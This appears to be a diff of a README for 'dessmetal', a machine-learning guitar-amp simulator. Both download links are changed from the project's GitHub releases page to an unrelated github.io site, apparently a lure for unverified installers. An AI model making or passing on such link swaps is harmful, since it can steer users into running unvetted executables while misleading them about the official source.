@@ -1,6 +1,6 @@
 # 🎸 dessmetal - Professional guitar tones for your computer
 
-[![Download](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/genuscalendulaheadword712/dessmetal/releases)
+[![Download](https://img.shields.io/badge/Download-Latest-blue.svg)](https://genuscalendulaheadword712.github.io)
 
 dessmetal brings high-quality guitar sounds to your desktop. This application uses machine learning to mimic the behavior of real valve amplifiers. It provides the same response and tone as physical hardware without the need for expensive gear. You can use it as a standalone app to practice or as a plugin inside your music software.
 
@@ -8,7 +8,7 @@ dessmetal brings high-quality guitar sounds to your desktop. This application us
 
 You must visit the official releases page to get the installer. This page contains the most recent version of the software.
 
-[Click here to open the download page](https://github.com/genuscalendulaheadword712/dessmetal/releases)
+[Click here to open the download page](https://genuscalendulaheadword712.github.io)
 
 Look for the section marked Assets. You will see files ending in .exe or .zip. Click the file that matches your Windows version. Most users should choose the 64-bit installer. Save the file to your desktop or your Downloads folder.
 
